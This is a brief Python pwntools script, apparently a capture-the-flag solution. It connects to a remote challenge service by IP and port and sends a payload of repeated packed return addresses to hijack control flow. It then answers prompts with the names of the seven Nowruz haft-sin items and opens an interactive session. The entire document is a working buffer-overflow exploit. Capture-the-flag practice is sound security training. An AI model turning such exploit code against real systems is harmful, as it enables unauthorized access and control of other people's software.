#!/usr/bin/env python3
from pwn import *

#p = process('./chall')
p = remote('164.92.176.247',5002)
p.sendlineafter(b':',p64(0x401216)*7)
q = ["Sonbol", "Sabzeh", "Seer", "Seeb", "Senjed", "Samanu", "Serkeh"]

for i in q:
	p.sendlineafter(b':',i.encode())

p.interactive()
